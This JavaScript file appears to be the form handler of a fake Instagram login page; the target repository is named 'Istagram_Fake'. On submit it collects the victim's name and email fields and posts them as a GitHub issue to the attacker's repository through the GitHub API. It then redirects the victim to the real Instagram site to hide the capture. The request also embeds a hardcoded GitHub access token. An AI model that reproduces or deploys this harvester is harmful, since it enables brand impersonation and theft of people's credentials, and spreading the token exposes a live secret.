document.getElementById('myForm').addEventListener('submit', async function(event) {
    event.preventDefault();
  
    const formData = new FormData(event.target);
    const data = Object.fromEntries(formData.entries());
    const issueTitle = `Form submission from ${data.name}`;
    const issueBody = `**Name**: ${data.name}\n**Email**: ${data.email}`;
  
    const response = await fetch('https://api.github.com/repos/Coronel4545/Istagram_Fake/issues', {
      method: 'POST',
      headers: {
        'Authorization': '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',
        'Accept': 'application/vnd.github.v3+json',
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        title: issueTitle,
        body: issueBody
      })
    });
  
    if (response.ok) {
      // Redireciona para o Instagram se o issue foi criado com sucesso
      return window.location.href = "https://www.instagram.com"; 
    } else {
      alert('Erro ao enviar formulário: ' + response.statusText);
    }
  });
  